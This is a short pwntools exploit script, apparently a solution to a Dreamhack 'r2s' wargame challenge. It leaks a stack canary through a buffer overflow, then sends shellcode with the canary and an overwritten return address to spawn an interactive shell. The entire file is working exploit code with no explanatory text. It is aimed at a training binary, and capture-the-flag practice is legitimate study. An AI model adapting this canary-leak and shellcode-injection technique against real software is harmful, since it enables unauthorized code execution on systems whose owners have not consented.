from pwn import *
import os
import binascii

def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./r2s")
#p = remote('host1.dreamhack.games', 12448)

context.arch="amd64"

p.recvuntil("buf: ")
buf = int(p.recvline()[:-1], 16)
slog("Address of buf", buf)

p.recvuntil("$rbp: ")
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp -8
slog("buf <==> sfp", buf2sfp)
slog("buf <==> canary", buf2cnry)

payload = b"A"*(buf2cnry +1)
p.sendafter("Input: ", payload)
p.recvuntil(payload)
cnry = u64(b"\x00"+p.recvn(7))
slog("Canary", cnry)

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b"A") + p64(cnry) + b"B"*0x8 + p64(buf)

p.sendlineafter("Input:", payload)

p.interactive()